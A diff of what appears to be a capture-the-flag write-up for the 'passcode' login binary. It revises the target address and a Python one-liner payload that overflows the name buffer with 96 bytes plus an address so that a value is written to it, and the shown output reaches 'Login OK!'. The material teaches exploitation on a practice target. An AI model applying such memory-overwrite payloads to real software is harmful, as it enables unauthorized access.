@@ -131,10 +131,10 @@ EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
 [-------------------------------------code-------------------------------------]
 ```
 
-0xffffd51c is our address and 0x080485d7 is the value we want to set it to. Note that 0x080485d7 in decimal is 134514135.
+0xffffd52c is our address and 0x080485d7 is the value we want to set it to. Note that 0x080485d7 in decimal is 134514135.
 
 ```
-passcode@ubuntu:~$ python3 -c "import os; os.write(1,b'a'*96+b'\x04\xa0\x04\x08\n'+b'134514135')" | ./passcode
+passcode@ubuntu:~$ python3 -c "import os; os.write(1,b'a'*96+b'\x2c\xd5\xff\xff\n'+b'134514135')" | ./passcode
 Toddler's Secure Login System 1.0 beta.
 enter you name : Welcome aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�!
 enter passcode1 : Login OK!
